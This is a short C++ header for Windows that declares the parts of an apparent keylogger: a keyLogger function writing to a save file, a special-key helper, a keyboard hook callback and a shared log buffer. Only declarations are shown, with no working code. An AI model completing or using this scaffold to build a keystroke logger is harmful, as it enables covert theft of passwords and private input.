#pragma once

#include <windows.h>
#include <fstream>
#include <mutex>

std::mutex logMutex;
std::string logData;

namespace Services {
    bool keyLogger(const std::string &saveFile);
}
bool SpecialKeys(int S_Key);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);